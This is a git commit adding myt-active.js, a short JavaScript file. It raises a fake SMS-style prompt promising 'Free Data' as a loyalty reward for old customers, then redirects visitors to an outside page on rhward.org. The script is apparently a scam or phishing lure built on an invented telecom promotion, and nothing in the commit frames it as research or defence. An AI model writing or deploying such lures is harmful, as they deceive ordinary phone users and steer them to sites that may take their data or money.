a5a69eb1f00c8035c883e1a2240b69b06f62fd7d
itidnewblog1 <newblog1itid@gmail.com>
2025-10-05 14:52:25 +0100

    Create myt-active.js

---
+++ myt-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE DATA'
+password=prompt('SMS: Congratulations, your Number is eligible to receive Free Data old customers reward, click OK to Activate data now cash','ACTIVATE DATA');
+if (password != 'ACTIVATE DATA') {
+location.href='https://rhward.org/myt.html';
+}
